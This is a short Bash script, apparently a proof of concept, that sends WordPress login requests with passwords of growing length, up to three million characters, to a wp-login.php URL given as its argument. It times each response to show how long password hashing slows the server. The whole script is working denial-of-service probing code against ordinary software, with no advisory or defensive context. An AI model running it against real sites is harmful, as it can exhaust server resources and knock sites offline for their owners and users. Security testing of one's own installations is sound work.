#!/bin/bash

usage() {
	echo -e "\nUsage:\$0 [../wp-login.php] \n"
}

# more then one Argument required
if [ $# -le 0 ]; then
	usage
	exit 1
fi



existierender_user=admins
array=( 10 20 30 40 50 100 1000 10000 50000 100000 1000000 2000000 3000000 )

for value in ${array[*]}
do
	head -c $value < /dev/zero | tr '\0' '\141' > passwort
	echo -n "Länge des Passworts: $(wc -c passwort | tr " " "\n" | head -n 1) "
	echo -n "log=$existierender_user&pwd=" > http_request
	cat passwort >> http_request
	#echo -n "&wp-submit=Log In&testcookie=1" >> http_request
	result=$({ /usr/bin/time --format "%e" curl --data @http_request $1 --silent 1>/dev/null; } 2>&1)
	echo "Antwortzeit: $result sekunden"
done

rm passwort
rm http_request
